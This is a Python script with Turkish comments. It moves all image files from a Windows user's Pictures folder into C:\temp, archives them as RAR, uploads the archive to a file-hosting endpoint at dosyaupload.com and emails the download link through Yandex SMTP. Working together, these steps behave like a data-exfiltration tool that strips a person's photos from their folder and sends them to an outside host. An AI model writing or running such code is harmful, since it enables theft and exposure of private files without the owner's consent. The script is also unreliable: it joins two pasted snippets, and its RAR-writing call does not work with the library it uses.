import os
import shutil
import rarfile
import requests

# Kaynak dizin
src_dir = "C:\\Users\\User\\Pictures"

# Hedef dizin
dst_dir = "C:\\temp"

# Tüm resim dosyalarının uzantıları
extensions = ('.jpg', '.jpeg', '.png', '.gif')

# Kaynak dizindeki tüm dosyaları tarama
for root, dirs, files in os.walk(src_dir):
    for file in files:
        # Dosyanın uzantısını kontrol et
        if file.endswith(extensions):
            # Dosyayı hedef dizine taşı
            shutil.move(os.path.join(root, file), dst_dir)

print("Tüm resim dosyaları 'temp' dizinine taşındı.")

import os
import shutil
import rarfile
import requests

# Kaynak dizin
src_dir = "C:\\temp"

# Rar dosyasının adı
rar_file = "temp.rar"

# Hedef dizin
dst_dir = "C:\\temp"

# Rar dosyasını oluştur
with rarfile.RarFile(rar_file, mode='w') as rf:
    rf.add(src_dir)

# dosyaupload.com sitesine dosya yükle
url = 'https://dosyaupload.com/api/upload'
file_path = dst_dir + '\\' + rar_file
with open(file_path, 'rb') as f:
    files = {'file': f}
    response = requests.post(url, files=files)
    response_json = response.json()
    download_link = response_json['download_link']

# E-posta linki gönder
import smtplib

sender_email = "mail"
receiver_email = "mail"
password = "password"

message = f"Subject: temp klasörünün linki\n\nMerhaba,\nAşağıda 'temp' klasörünün dosyaupload.com'da yüklü hali için linki var.\n{download_link}"

server = smtplib.SMTP('smtp.yandex.com', 587)
server.starttls()
server.login(sender_email, password)
print("Bağlandı")
server.sendmail(sender_email, receiver_email, message)
print("E-posta başarıyla gönderildi!")
server.quit()
